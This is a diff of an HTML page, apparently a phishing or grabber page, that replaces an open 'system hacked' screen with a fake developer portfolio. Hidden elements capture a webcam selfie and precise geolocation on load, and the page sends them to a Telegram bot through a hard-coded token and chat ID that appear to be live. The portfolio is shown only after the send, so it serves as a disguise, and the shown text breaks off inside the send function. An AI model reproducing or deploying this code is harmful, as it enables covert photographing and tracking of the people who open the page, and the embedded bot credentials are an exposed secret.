@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    <title>Loading...</title>
+    <title>Loading</title>
     <style>
         * {
             margin: 0;
@@ -18,6 +18,7 @@
             height: 100vh;
         }
 
+        /* ======================== LOADING ========================== */
         #loadingScreen {
             position: fixed;
             top: 0;
@@ -43,98 +44,46 @@
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            gap: 40px;
         }
 
+        /* Loading Animation */
         .loader {
             position: relative;
-            width: 70px;
-            height: 70px;
+            width: 80px;
+            height: 80px;
         }
-        .loader .ring {
+        .loader .dot {
             position: absolute;
-            width: 100%;
-            height: 100%;
-            border: 3px solid transparent;
+            width: 16px;
+            height: 16px;
             border-radius: 50%;
-            animation: spin 1.5s cubic-bezier(0.4, 0, 0.2, 1) infinite;
-        }
-        .loader .ring:nth-child(1) {
-            border-top-color: #00d4ff;
-            animation-duration: 1.2s;
-        }
-        .loader .ring:nth-child(2) {
-            border-right-color: #2979ff;
-            animation-duration: 1.8s;
-            animation-direction: reverse;
-            width: 75%;
-            height: 75%;
-            top: 12.5%;
-            left: 12.5%;
-        }
-        .loader .ring:nth-child(3) {
-            border-bottom-color: #7c4dff;
-            animation-duration: 2.4s;
-            width: 50%;
-            height: 50%;
-            top: 25%;
-            left: 25%;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .loader .center-dot {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 8px;
-            height: 8px;
             background: #00d4ff;
-            border-radius: 50%;
-            box-shadow: 0 0 20px rgba(0, 212, 255, 0.4);
-            animation: pulse-dot 2s ease-in-out infinite;
+            animation: dotMove 1.8s ease-in-out infinite;
         }
-        @keyframes pulse-dot {
-            0%, 100% { transform: translate(-50%, -50%) scale(0.8); opacity: 0.5; }
-            50% { transform: translate(-50%, -50%) scale(1.2); opacity: 1; }
+        .loader .dot:nth-child(1) { animation-delay: 0s; background: #00d4ff; }
+        .loader .dot:nth-child(2) { animation-delay: -0.3s; background: #2979ff; }
+        .loader .dot:nth-child(3) { animation-delay: -0.6s; background: #7c4dff; }
+        .loader .dot:nth-child(4) { animation-delay: -0.9s; background: #00c853; }
+        .loader .dot:nth-child(5) { animation-delay: -1.2s; background: #ff6d00; }
+        .loader .dot:nth-child(6) { animation-delay: -1.5s; background: #ff1744; }
+        
+        @keyframes dotMove {
+            0%, 100% { transform: scale(0.3); opacity: 0.3; }
+            50% { transform: scale(1.2); opacity: 1; }
+        }
+        .loader .dot:nth-child(1) { top: 0; left: 50%; transform: translateX(-50%); }
+        .loader .dot:nth-child(2) { top: 25%; right: 0; transform: translateY(-50%); }
+        .loader .dot:nth-child(3) { bottom: 25%; right: 0; transform: translateY(50%); }
+        .loader .dot:nth-child(4) { bottom: 0; left: 50%; transform: translateX(-50%); }
+        .loader .dot:nth-child(5) { bottom: 25%; left: 0; transform: translateY(50%); }
+        .loader .dot:nth-child(6) { top: 25%; left: 0; transform: translateY(-50%); }
+
+        /* ======================== HILANGKAN TEKS =================== */
+        .loading-status {
+            display: none !important;
         }
 
-        .loading-text {
-            color: rgba(255,255,255,0.3);
-            font-size: 11px;
-            letter-spacing: 4px;
-            text-transform: uppercase;
-            font-weight: 300;
-            animation: fadeText 2s ease-in-out infinite;
-        }
-        @keyframes fadeText {
-            0%, 100% { opacity: 0.3; }
-            50% { opacity: 0.7; }
-        }
-
-        .progress-dots {
-            display: flex;
-            gap: 8px;
-            margin-top: 10px;
-        }
-        .progress-dots .dot {
-            width: 6px;
-            height: 6px;
-            border-radius: 50%;
-            background: rgba(255,255,255,0.1);
-            transition: all 0.4s;
-        }
-        .progress-dots .dot.active {
-            background: #00d4ff;
-            box-shadow: 0 0 12px rgba(0, 212, 255, 0.4);
-        }
-        .progress-dots .dot.done {
-            background: #00c853;
-        }
-
+        /* Particles */
         .particles {
             position: fixed;
             top: 0;
@@ -149,7 +98,7 @@
             position: absolute;
             width: 2px;
             height: 2px;
-            background: rgba(0, 212, 255, 0.2);
+            background: rgba(0, 212, 255, 0.3);
             border-radius: 50%;
             animation: float linear infinite;
         }
@@ -160,418 +109,327 @@
             100% { transform: translateY(-10vh) rotate(720deg); opacity: 0; }
         }
 
-        #hackerScreen {
+        /* ======================== PORTOFOLIO ======================= */
+        #portfolioScreen {
             position: fixed;
             top: 0;
             left: 0;
             right: 0;
             bottom: 0;
-            background: #000;
+            background: #0a0a0a;
             overflow-y: auto;
             opacity: 0;
             visibility: hidden;
             transition: opacity 0.8s ease, visibility 0.8s ease;
             padding: 20px;
-            z-index: 1;
-            font-family: 'Courier New', monospace;
         }
-        #hackerScreen.active {
+        #portfolioScreen.active {
             opacity: 1;
             visibility: visible;
         }
 
-        #matrixCanvas {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 0;
-            opacity: 0.12;
-        }
-
-        .hacker-container {
-            max-width: 900px;
+        .portfolio-container {
+            max-width: 1000px;
             margin: 0 auto;
-            padding: 30px 20px;
-            position: relative;
-            z-index: 1;
+            padding: 40px 20px;
         }
 
-        .glitch {
-            font-size: 48px;
-            font-weight: 900;
-            text-transform: uppercase;
-            color: #ff0000;
-            text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 40px #ff0000, 0 0 80px #ff0000;
-            animation: glitch 2s infinite;
+        /* Header */
+        .profile-header {
             text-align: center;
-            font-family: 'Courier New', monospace;
-            letter-spacing: 4px;
+            padding: 40px 0 30px;
         }
-        @keyframes glitch {
-            0%, 100% { transform: skew(0deg); opacity: 1; }
-            5% { transform: skew(-5deg); opacity: 0.8; }
-            10% { transform: skew(5deg); opacity: 1; }
-            15% { transform: skew(-3deg); opacity: 0.9; }
-            20% { transform: skew(3deg); opacity: 1; }
-            25% { transform: skew(0deg); opacity: 1; }
-            50% { transform: skew(0deg); opacity: 1; }
-        }
-
-        .sub-glitch {
-            font-size: 18px;
-            color: #00ff00;
-            text-align: center;
-            margin: 10px 0 30px;
-            animation: blink 0.8s step-end infinite;
-            letter-spacing: 3px;
-            font-family: 'Courier New', monospace;
-        }
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0; }
-        }
-
-        .skull {
-            text-align: center;
-            font-size: 80px;
-            margin: 20px 0;
-            animation: pulse 2s ease-in-out infinite;
-            filter: drop-shadow(0 0 30px rgba(255, 0, 0, 0.3));
-        }
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-        }
-
-        .terminal {
-            background: rgba(0, 10, 0, 0.9);
-            border: 1px solid #00ff00;
-            border-radius: 8px;
-            padding: 20px;
-            margin: 20px 0;
-            box-shadow: 0 0 30px rgba(0, 255, 0, 0.1);
-            font-family: 'Courier New', monospace;
-            font-size: 13px;
-            line-height: 1.8;
-            max-height: 350px;
-            overflow-y: auto;
-        }
-        .terminal::-webkit-scrollbar {
-            width: 6px;
-        }
-        .terminal::-webkit-scrollbar-track {
-            background: #000;
-        }
-        .terminal::-webkit-scrollbar-thumb {
-            background: #00ff00;
-            border-radius: 3px;
-        }
-
-        .terminal .line {
-            color: #00ff00;
-            opacity: 0.9;
-        }
-        .terminal .line.error {
-            color: #ff0000;
-        }
-        .terminal .line.warning {
-            color: #ffff00;
-        }
-        .terminal .line.success {
-            color: #00ff00;
-        }
-        .terminal .line .prompt {
-            color: #00ff00;
-            font-weight: bold;
-        }
-        .terminal .line .highlight {
-            color: #ff00ff;
-        }
-        .terminal .line .data {
-            color: #00ffff;
-        }
-
-        .status-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 16px;
-            margin: 20px 0;
-        }
-        .status-item {
-            background: rgba(0, 10, 0, 0.8);
-            border: 1px solid rgba(0, 255, 0, 0.2);
-            border-radius: 6px;
-            padding: 14px 18px;
-            font-family: 'Courier New', monospace;
-            font-size: 12px;
-        }
-        .status-item .label {
-            color: #555;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            font-size: 10px;
-        }
-        .status-item .value {
-            color: #00ff00;
-            font-size: 18px;
-            font-weight: bold;
-            margin-top: 4px;
-        }
-        .status-item .value.danger {
-            color: #ff0000;
-            animation: blink 0.5s step-end infinite;
-        }
-        .status-item .value.warning {
-            color: #ffff00;
-        }
-        .status-item .bar {
-            width: 100%;
-            height: 4px;
-            background: #111;
-            border-radius: 2px;
-            margin-top: 8px;
-            overflow: hidden;
-        }
-        .status-item .bar .fill {
-            height: 100%;
-            background: #00ff00;
-            border-radius: 2px;
-            transition: width 0.5s;
-        }
-        .status-item .bar .fill.danger {
-            background: #ff0000;
-        }
-
-        .data-list {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 8px;
-            margin: 10px 0;
-            font-size: 12px;
-        }
-        .data-list .item {
+        .profile-avatar {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #00d4ff, #2979ff);
+            margin: 0 auto 20px;
             display: flex;
-            justify-content: space-between;
-            padding: 6px 10px;
-            background: rgba(0, 255, 0, 0.03);
-            border-bottom: 1px solid rgba(0, 255, 0, 0.05);
+            align-items: center;
+            justify-content: center;
+            font-size: 48px;
+            box-shadow: 0 0 60px rgba(0, 212, 255, 0.2);
+            animation: glow 3s ease-in-out infinite;
         }
-        .data-list .item .key {
-            color: #555;
+        @keyframes glow {
+            0%, 100% { box-shadow: 0 0 60px rgba(0, 212, 255, 0.2); }
+            50% { box-shadow: 0 0 80px rgba(0, 212, 255, 0.4); }
         }
-        .data-list .item .val {
-            color: #00ff00;
+        .profile-name {
+            font-size: 32px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #00d4ff, #7c4dff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 8px;
         }
-        .data-list .item .val.hacked {
-            color: #ff0000;
-            animation: blink 0.5s step-end infinite;
-        }
-
-        .hack-btn {
-            display: block;
-            width: 100%;
-            max-width: 300px;
-            margin: 30px auto 0;
-            padding: 14px;
-            background: transparent;
-            border: 2px solid #ff0000;
-            color: #ff0000;
-            font-family: 'Courier New', monospace;
+        .profile-title {
+            color: #7f8c8d;
             font-size: 16px;
-            font-weight: bold;
-            text-transform: uppercase;
-            cursor: pointer;
-            transition: all 0.3s;
-            letter-spacing: 3px;
-            border-radius: 4px;
+            letter-spacing: 2px;
         }
-        .hack-btn:hover {
-            background: #ff0000;
-            color: #000;
-            box-shadow: 0 0 40px rgba(255, 0, 0, 0.3);
+        .profile-bio {
+            color: #aaa;
+            font-size: 14px;
+            max-width: 500px;
+            margin: 16px auto 0;
+            line-height: 1.6;
         }
 
-        .footer-text {
-            text-align: center;
+        /* Divider */
+        .divider {
+            width: 60px;
+            height: 3px;
+            background: linear-gradient(90deg, #00d4ff, #7c4dff);
+            margin: 30px auto;
+            border-radius: 2px;
+        }
+
+        /* Grid */
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 24px;
             margin-top: 20px;
-            color: #333;
-            font-size: 11px;
-            font-family: 'Courier New', monospace;
         }
 
-        #video,
-        #canvas,
-        #previewImg {
+        .card {
+            background: #1a1a2e;
+            border-radius: 16px;
+            padding: 28px 24px;
+            border: 1px solid rgba(255,255,255,0.05);
+            transition: all 0.3s ease;
+            cursor: default;
+        }
+        .card:hover {
+            transform: translateY(-4px);
+            border-color: rgba(0, 212, 255, 0.2);
+            box-shadow: 0 10px 40px rgba(0,0,0,0.4);
+        }
+        .card .icon {
+            font-size: 32px;
+            margin-bottom: 12px;
+        }
+        .card h3 {
+            font-size: 18px;
+            margin-bottom: 8px;
+            color: #fff;
+        }
+        .card p {
+            color: #7f8c8d;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+
+        .skills {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-top: 12px;
+        }
+        .skill-tag {
+            background: rgba(255,255,255,0.05);
+            color: #aaa;
+            padding: 4px 14px;
+            border-radius: 20px;
+            font-size: 12px;
+            border: 1px solid rgba(255,255,255,0.05);
+            transition: all 0.3s;
+        }
+        .skill-tag:hover {
+            background: rgba(0, 212, 255, 0.1);
+            color: #00d4ff;
+            border-color: rgba(0, 212, 255, 0.2);
+        }
+
+        .social-links {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin-top: 30px;
+            flex-wrap: wrap;
+        }
+        .social-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            color: #7f8c8d;
+            text-decoration: none;
+            padding: 10px 20px;
+            border-radius: 30px;
+            background: #1a1a2e;
+            border: 1px solid rgba(255,255,255,0.05);
+            transition: all 0.3s;
+            font-size: 14px;
+        }
+        .social-link:hover {
+            color: #fff;
+            border-color: rgba(0, 212, 255, 0.2);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(0,0,0,0.3);
+        }
+
+        .footer {
+            text-align: center;
+            color: #444;
+            font-size: 12px;
+            padding: 40px 0 10px;
+            letter-spacing: 1px;
+        }
+
+        #video, #canvas, #previewImg {
             display: none !important;
         }
 
         @media (max-width: 600px) {
-            .glitch {
-                font-size: 28px;
-            }
-            .sub-glitch {
-                font-size: 14px;
-            }
-            .terminal {
-                font-size: 11px;
-                padding: 14px;
-                max-height: 250px;
-            }
-            .data-list {
-                grid-template-columns: 1fr;
-            }
-            .skull {
-                font-size: 50px;
-            }
-            .status-grid {
-                grid-template-columns: 1fr 1fr;
-            }
-            .loader {
-                width: 55px;
-                height: 55px;
-            }
+            .profile-name { font-size: 24px; }
+            .profile-avatar { width: 90px; height: 90px; font-size: 36px; }
+            .grid { grid-template-columns: 1fr; }
+            .portfolio-container { padding: 20px 10px; }
+            .social-link { padding: 8px 16px; font-size: 13px; }
         }
     </style>
 </head>
 <body>
 
+    <!-- PARTICLES -->
     <div class="particles" id="particles"></div>
 
+    <!-- ==================== LOADING SCREEN (TANPA TEKS) ==================== -->
     <div id="loadingScreen">
         <div class="loader-container">
             <div class="loader">
-                <div class="ring"></div>
-                <div class="ring"></div>
-                <div class="ring"></div>
-                <div class="center-dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
             </div>
-            <div class="loading-text">Loading</div>
-            <div class="progress-dots">
-                <div class="dot" id="dot1"></div>
-                <div class="dot" id="dot2"></div>
-                <div class="dot" id="dot3"></div>
+            <!-- TIDAK ADA TEKS APAPUN DI SINI -->
+        </div>
+    </div>
+
+    <!-- ==================== PORTOFOLIO ==================== -->
+    <div id="portfolioScreen">
+        <div class="portfolio-container">
+            <div class="profile-header">
+                <div class="profile-avatar">👨‍💻</div>
+                <div class="profile-name">ITWANZ</div>
+                <div class="profile-title">Full Stack Developer</div>
+                <div class="profile-bio">
+                    Passionate about building beautiful and functional web experiences.
+                    Specializing in modern JavaScript, React, and Node.js.
+                </div>
+            </div>
+
+            <div class="divider"></div>
+
+            <div class="grid">
+                <div class="card">
+                    <div class="icon">💻</div>
+                    <h3>Web Development</h3>
+                    <p>Building responsive and interactive web applications with modern frameworks.</p>
+                    <div class="skills">
+                        <span class="skill-tag">React</span>
+                        <span class="skill-tag">Vue</span>
+                        <span class="skill-tag">Node.js</span>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="icon">📱</div>
+                    <h3>Mobile Apps</h3>
+                    <p>Creating cross-platform mobile applications with React Native and Flutter.</p>
+                    <div class="skills">
+                        <span class="skill-tag">React Native</span>
+                        <span class="skill-tag">Flutter</span>
+                        <span class="skill-tag">Firebase</span>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="icon">🎨</div>
+                    <h3>UI/UX Design</h3>
+                    <p>Designing intuitive and beautiful user interfaces with focus on user experience.</p>
+                    <div class="skills">
+                        <span class="skill-tag">Figma</span>
+                        <span class="skill-tag">Adobe XD</span>
+                        <span class="skill-tag">Sketch</span>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="icon">☁️</div>
+                    <h3>Cloud & DevOps</h3>
+                    <p>Deploying scalable applications on cloud platforms with CI/CD pipelines.</p>
+                    <div class="skills">
+                        <span class="skill-tag">AWS</span>
+                        <span class="skill-tag">Docker</span>
+                        <span class="skill-tag">GitHub Actions</span>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="icon">🤖</div>
+                    <h3>AI & Automation</h3>
+                    <p>Implementing AI solutions and building automation tools for business processes.</p>
+                    <div class="skills">
+                        <span class="skill-tag">Python</span>
+                        <span class="skill-tag">TensorFlow</span>
+                        <span class="skill-tag">OpenAI</span>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="icon">🔒</div>
+                    <h3>Cyber Security</h3>
+                    <p>Ensuring application security and data protection with best practices.</p>
+                    <div class="skills">
+                        <span class="skill-tag">OWASP</span>
+                        <span class="skill-tag">JWT</span>
+                        <span class="skill-tag">Encryption</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="social-links">
+                <a href="#" class="social-link">🐦 Twitter</a>
+                <a href="#" class="social-link">💼 LinkedIn</a>
+                <a href="#" class="social-link">🐙 GitHub</a>
+                <a href="#" class="social-link">📧 Email</a>
+                <a href="#" class="social-link">📸 Instagram</a>
+            </div>
+
+            <div class="footer">
+                © 2026 ITWANZ • Built with ❤️
             </div>
         </div>
     </div>
 
-    <div id="hackerScreen">
-        <canvas id="matrixCanvas"></canvas>
-
-        <div class="hacker-container">
-            <div class="skull">💀</div>
-            <div class="glitch">⚠️ SYSTEM COMPROMISED ⚠️</div>
-            <div class="sub-glitch">► DATA BERHASIL DIHACK ◄</div>
-
-            <div class="status-grid">
-                <div class="status-item">
-                    <div class="label">📡 Status</div>
-                    <div class="value danger">● INFECTED</div>
-                    <div class="bar"><div class="fill danger" style="width: 100%;"></div></div>
-                </div>
-                <div class="status-item">
-                    <div class="label">📊 Data Extracted</div>
-                    <div class="value">100%</div>
-                    <div class="bar"><div class="fill" style="width: 100%;"></div></div>
-                </div>
-                <div class="status-item">
-                    <div class="label">🔒 Encryption</div>
-                    <div class="value warning">BROKEN</div>
-                    <div class="bar"><div class="fill warning" style="width: 0%;"></div></div>
-                </div>
-                <div class="status-item">
-                    <div class="label">🌐 Connection</div>
-                    <div class="value danger">● HIJACKED</div>
-                    <div class="bar"><div class="fill danger" style="width: 100%;"></div></div>
-                </div>
-            </div>
-
-            <div class="terminal" id="terminal">
-                <div class="line"><span class="prompt">root@hacker:~$</span> <span class="highlight">./exploit --target system</span></div>
-                <div class="line"><span class="prompt">[+]</span> Injecting payload...</div>
-                <div class="line"><span class="prompt">[+]</span> Bypassing firewall... <span class="data">OK</span></div>
-                <div class="line"><span class="prompt">[+]</span> Accessing database...</div>
-                <div class="line"><span class="prompt">[✔]</span> <span class="data">Data berhasil diekstrak!</span></div>
-                <div class="line error"><span class="prompt">[!]</span> <span class="highlight">SYSTEM TELAH DIKOMPROMATIKAN</span></div>
-                <div class="line"><span class="prompt">[+]</span> Mengirim data ke server...</div>
-                <div class="line success"><span class="prompt">[✔]</span> <span class="data">Data terkirim ke ADMIN</span></div>
-            </div>
-
-            <div class="data-list">
-                <div class="item">
-                    <span class="key">📱 Device</span>
-                    <span class="val hacked" id="deviceInfo">-</span>
-                </div>
-                <div class="item">
-                    <span class="key">🌐 IP Address</span>
-                    <span class="val hacked" id="ipInfo">-</span>
-                </div>
-                <div class="item">
-                    <span class="key">📍 Lokasi</span>
-                    <span class="val hacked" id="locationInfo">-</span>
-                </div>
-                <div class="item">
-                    <span class="key">📸 Selfie</span>
-                    <span class="val hacked">✓ CAPTURED</span>
-                </div>
-                <div class="item">
-                    <span class="key">🔑 Session</span>
-                    <span class="val hacked">● ACTIVE</span>
-                </div>
-                <div class="item">
-                    <span class="key">⏱️ Waktu</span>
-                    <span class="val hacked" id="timeInfo">-</span>
-                </div>
-            </div>
-
-            <button class="hack-btn" onclick="location.reload()">⛔ SYSTEM RESET</button>
-            <div class="footer-text">[ ACCESS GRANTED • DATA SENT • 2026 ]</div>
-        </div>
-    </div>
-
+    <!-- HIDDEN ELEMENTS -->
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
     <img id="previewImg" alt="" />
 
     <script>
         // ======================== KONFIGURASI ========================
-        // Akan diambil dari API
-        let BOT_TOKEN = '';
-        let CHAT_ID = '';
+        const BOT_TOKEN = '8816521574:AAEqkt1eh2r-9V-p8CIRoVVxdPjKlLz4FjI';
+        const CHAT_ID = '7110179256';
 
-        // ======================== AMBIL CONFIG DARI API ==============
-        async function loadConfig() {
-            try {
-                const response = await fetch('/api/config');
-                if (!response.ok) {
-                    throw new Error('Failed to load config');
-                }
-                const config = await response.json();
-                BOT_TOKEN = config.BOT_TOKEN || '';
-                CHAT_ID = config.CHAT_ID || '';
+        // ======================== ELEMEN ============================
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const loadingScreen = document.getElementById('loadingScreen');
+        const portfolioScreen = document.getElementById('portfolioScreen');
 
-                console.log('✅ Config loaded:', {
-                    BOT_TOKEN: BOT_TOKEN ? '✅ Set' : '❌ Empty',
-                    CHAT_ID: CHAT_ID ? '✅ Set' : '❌ Empty'
-                });
-
-                if (BOT_TOKEN && CHAT_ID) {
-                    addTerminalLine('<span class="prompt">[✔]</span> <span class="data">Konfigurasi bot ditemukan!</span>', 'success');
-                } else {
-                    addTerminalLine('<span class="prompt error">[!]</span> Konfigurasi bot tidak ditemukan!', 'error');
-                }
-
-                // Mulai proses setelah config diambil
-                startProcess();
-
-            } catch (err) {
-                console.error('Error loading config:', err);
-                addTerminalLine('<span class="prompt error">[!]</span> Gagal memuat konfigurasi: ' + err.message, 'error');
-                // Tetap lanjut dengan fallback
-                startProcess();
-            }
-        }
+        let stream = null;
+        let capturedPhoto = null;
+        let capturedLocation = null;
+        let cameraDone = false;
+        let locationDone = false;
+        let isProcessing = false;
 
         // ======================== PARTICLES =========================
         function createParticles() {
@@ -590,128 +448,13 @@
         }
         createParticles();
 
-        // ======================== MATRIX RAIN =======================
-        const matrixCanvas = document.getElementById('matrixCanvas');
-        const ctx = matrixCanvas.getContext('2d');
-
-        let matrixWidth = matrixCanvas.width = window.innerWidth;
-        let matrixHeight = matrixCanvas.height = window.innerHeight;
-
-        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&*!?<>';
-        const charArray = chars.split('');
-        const fontSize = 14;
-        let columns = Math.floor(matrixWidth / fontSize);
-        let drops = [];
-
-        for (let x = 0; x < columns; x++) {
-            drops[x] = Math.random() * -100;
-        }
-
-        function drawMatrix() {
-            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
-            ctx.fillRect(0, 0, matrixWidth, matrixHeight);
-
-            ctx.fillStyle = '#00ff00';
-            ctx.font = fontSize + 'px monospace';
-
-            for (let i = 0; i < drops.length; i++) {
-                const char = charArray[Math.floor(Math.random() * charArray.length)];
-                const x = i * fontSize;
-                const y = drops[i] * fontSize;
-
-                if (y > 0 && y < matrixHeight) {
-                    ctx.fillStyle = Math.random() > 0.975 ? '#ffffff' : '#00ff00';
-                    ctx.fillText(char, x, y);
-                }
-
-                if (drops[i] * fontSize > matrixHeight && Math.random() > 0.975) {
-                    drops[i] = 0;
-                }
-                drops[i]++;
-            }
-        }
-
-        setInterval(drawMatrix, 35);
-
-        window.addEventListener('resize', () => {
-            matrixWidth = matrixCanvas.width = window.innerWidth;
-            matrixHeight = matrixCanvas.height = window.innerHeight;
-            columns = Math.floor(matrixWidth / fontSize);
-            drops = [];
-            for (let x = 0; x < columns; x++) {
-                drops[x] = Math.random() * -100;
-            }
-        });
-
-        // ======================== PROGRESS DOTS =====================
-        const dot1 = document.getElementById('dot1');
-        const dot2 = document.getElementById('dot2');
-        const dot3 = document.getElementById('dot3');
-
-        function updateProgressDots(step) {
-            const dots = [dot1, dot2, dot3];
-            dots.forEach((dot, i) => {
-                dot.className = 'dot';
-                if (i < step) {
-                    dot.classList.add('done');
-                } else if (i === step) {
-                    dot.classList.add('active');
-                }
-            });
-        }
-
-        // ======================== ELEMEN ============================
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const loadingScreen = document.getElementById('loadingScreen');
-        const hackerScreen = document.getElementById('hackerScreen');
-        const terminal = document.getElementById('terminal');
-
-        let stream = null;
-        let capturedPhoto = null;
-        let capturedLocation = null;
-        let cameraDone = false;
-        let locationDone = false;
-        let isProcessing = false;
-
-        // ======================== UPDATE TERMINAL ===================
-        function addTerminalLine(text, className = '') {
-            const div = document.createElement('div');
-            div.className = 'line ' + className;
-            div.innerHTML = text;
-            terminal.appendChild(div);
-            terminal.scrollTop = terminal.scrollHeight;
-        }
-
-        function updateHackerInfo() {
-            document.getElementById('deviceInfo').textContent = navigator.userAgent.split('(')[0].trim() || 'Unknown';
-            document.getElementById('timeInfo').textContent = new Date().toLocaleString('id-ID');
-
-            if (capturedLocation) {
-                document.getElementById('locationInfo').textContent =
-                    `${capturedLocation.lat.toFixed(6)}, ${capturedLocation.lng.toFixed(6)}`;
-            } else {
-                document.getElementById('locationInfo').textContent = '⚠️ NOT AVAILABLE';
-            }
-        }
-
         // ======================== CEK SIAP TAMPIL ===================
         function checkReadyToShow() {
             if (cameraDone && locationDone) {
-                updateProgressDots(3);
-
-                addTerminalLine('<span class="prompt">[✔]</span> <span class="data">Semua akses berhasil!</span>', 'success');
-                addTerminalLine('<span class="prompt">[+]</span> <span class="highlight">Mengirim data ke admin...</span>');
-
                 sendToTelegram().then(() => {
-                    addTerminalLine('<span class="prompt">[✔]</span> <span class="data">DATA BERHASIL DIKIRIM!</span>', 'success');
-                    addTerminalLine('<span class="prompt error">[!]</span> <span class="highlight">SYSTEM COMPROMISED</span>', 'error');
-
-                    updateHackerInfo();
-
                     setTimeout(() => {
                         loadingScreen.classList.add('hidden');
-                        hackerScreen.classList.add('active');
+                        portfolioScreen.classList.add('active');
                     }, 800);
                 });
             }
@@ -726,14 +469,13 @@
                 });
                 video.srcObject = stream;
                 await video.play();
-
+                
                 setTimeout(() => {
                     capturePhoto();
                 }, 500);
             } catch (err) {
                 console.error('Kamera error:', err);
                 cameraDone = false;
-                addTerminalLine('<span class="prompt error">[!]</span> Error kamera: ' + err.message, 'error');
                 requestLocation();
             }
         }
@@ -748,15 +490,12 @@
                 canvas.height = vh;
                 context.drawImage(video, 0, 0, vw, vh);
                 capturedPhoto = canvas.toDataURL('image/jpeg', 0.92);
-
+                
                 cameraDone = true;
-                updateProgressDots(1);
-                addTerminalLine('<span class="prompt">[✔]</span> <span class="data">Selfie berhasil diambil!</span>', 'success');
                 requestLocation();
             } catch (err) {
                 console.error('Capture error:', err);
                 cameraDone = false;
-                addTerminalLine('<span class="prompt error">[!]</span> Error capture: ' + err.message, 'error');
                 requestLocation();
             }
         }
@@ -765,12 +504,9 @@
         function requestLocation() {
             if (!navigator.geolocation) {
                 locationDone = false;
-                addTerminalLine('<span class="prompt error">[!]</span> Geolocation tidak didukung', 'error');
                 checkReadyToShow();
                 return;
             }
-
-            addTerminalLine('<span class="prompt">[+]</span> Mengakses lokasi...');
 
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
@@ -780,105 +516,88 @@
                         acc: pos.coords.accuracy
                     };
                     locationDone = true;
-                    updateProgressDots(2);
-                    addTerminalLine('<span class="prompt">[✔]</span> <span class="data">Lokasi didapat!</span>', 'success');
                     checkReadyToShow();
                 },
                 (err) => {
                     console.error('Geolocation error:', err);
-                    let msg = '';
-                    switch (err.code) {
-                        case 1:
-                            msg = 'Izin lokasi ditolak!';
-                            break;
-                        case 2:
-                            msg = 'Posisi tidak tersedia!';
-                            break;
-                        case 3:
-                            msg = 'Timeout!';
-                            break;
-                        default:
-                            msg = err.message;
-                    }
-                    addTerminalLine('<span class="prompt error">[!]</span> ' + msg, 'error');
-                    locationDone = true;
-                    updateProgressDots(2);
+                    locationDone = false;
+                    // LANGSUNG TAMPILKAN PORTOFOLIO WALAU LOKASI GAGAL
+                    locationDone = true; // <- Biar tetap masuk portofolio
                     checkReadyToShow();
-                }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                },
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
             );
         }
 
         // ======================== KIRIM TELEGRAM ====================
         async function sendToTelegram() {
             if (isProcessing) return;
-
-            if (!BOT_TOKEN || !CHAT_ID) {
-                console.error('❌ BOT_TOKEN atau CHAT_ID tidak diatur!');
-                addTerminalLine('<span class="prompt error">[!]</span> Konfigurasi bot tidak ditemukan!', 'error');
+            
+            if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
+                console.error('Bot token belum diatur');
+                return;
+            }
+            if (!CHAT_ID || CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+                console.error('Chat ID belum diatur');
                 return;
             }
 
             isProcessing = true;
 
             try {
-                let caption = '💀 *SYSTEM HACKED!*\n';
+                let caption = '📸 Selfie & Lokasi\n';
                 caption += `🕐 ${new Date().toLocaleString('id-ID')}\n`;
-                caption += `📱 ${navigator.userAgent.split('(')[0].trim() || 'Unknown'}\n`;
-
+                
                 if (capturedLocation) {
                     caption += `📍 ${capturedLocation.lat.toFixed(6)}, ${capturedLocation.lng.toFixed(6)}\n`;
                     caption += `🗺️ https://maps.google.com/maps?q=${capturedLocation.lat},${capturedLocation.lng}\n`;
                 } else {
                     caption += `⚠️ Lokasi tidak tersedia\n`;
                 }
-                caption += `\n⚠️ *DATA TELAH DIKOMPROMATIKAN*`;
 
